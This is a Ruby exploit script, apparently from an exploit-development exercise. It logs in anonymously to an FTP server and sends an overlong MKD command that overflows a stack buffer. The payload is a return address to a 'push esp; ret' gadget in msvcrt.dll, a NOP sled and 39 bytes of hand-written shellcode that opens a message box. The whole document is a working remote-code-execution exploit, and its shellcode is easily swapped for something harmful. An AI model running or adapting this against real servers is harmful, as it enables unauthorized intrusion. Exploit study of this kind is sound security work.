#!/usr/bin/env ruby

require 'socket'

#----------------------------------------------------------------------------------#
# (*) MessageBoxA                                                                  #
# (*) arwin.exe => user32.dll - MessageBoxA 0x7E4507EA                             #
# (*) MSDN Structure:                                                              #
#                                                                                  #
# int WINAPI MessageBox(          => PTR to MessageBoxA                            #
#   __in_opt  HWND hWnd,          => 0x0                                           #
#   __in_opt  LPCTSTR lpText,     => Pop the box!                                  #
#   __in_opt  LPCTSTR lpCaption,  => b33f                                          #
#   __in      UINT uType          => 0x0                                           #
# );                                                                               #
#                                                                                  #
# Final Size => 39-bytes (metasploit version size => 287-bytes)                    #
#----------------------------------------------------------------------------------#
MessageBoxA = 
"\x33\xc0"                         + # XOR EAX,EAX
"\x50"                             + # PUSH EAX      => padding for lpCaption
"\x68\x30\x6E\x65\x20" +
"\x68\x41\x72\x6D\x20" +
"\x8B\xCC"                         + # MOV ECX,ESP   => PTR to lpCaption
"\x50"                             + # PUSH EAX      => padding for lpText
"\x68\x53\x6F\x70\x61" +
"\x68\x4F\x70\x61\x20" + 
"\x8B\xD4"                         + # MOV EDX,ESP   => PTR to lpText
"\x50"                             + # PUSH EAX - uType=0x0
"\x51"                             + # PUSH ECX - lpCaption
"\x52"                             + # PUSH EDX - lpText
"\x50"                             + # PUSH EAX - hWnd=0x0
"\xBE\xEA\x07\x45\x7E"             + # MOV ESI,USER32.MessageBoxA
"\xFF\xD6"                           # CALL ESI

#----------------------------------------------------------------------------------#
# Badchars: \x00\x0A\x0D                                                           #
# 0x77c35459 : push esp #  ret  | msvcrt.dll                                       #
# shellcode at ESP => space 749-bytes                                              #
#----------------------------------------------------------------------------------#

buffer = "\x90" * 20 + MessageBoxA
evil = "\x41" * 247 + "\x59\x54\xC3\x77" + buffer + "\x43" * (749 - buffer.size)

host = "192.168.0.15"
port = "21"

s = TCPSocket.open(host, port)
s.recv(1024)

s.send("USER anonymous\r\n", 0)
s.recv(1024)
s.send("PASS anonymous\r\n", 0)
s.recv(1024)
s.send("MKD " + evil + "\r\n", 0)
s.recv(1024)
s.send("QUIT\r\n", 0)
s.close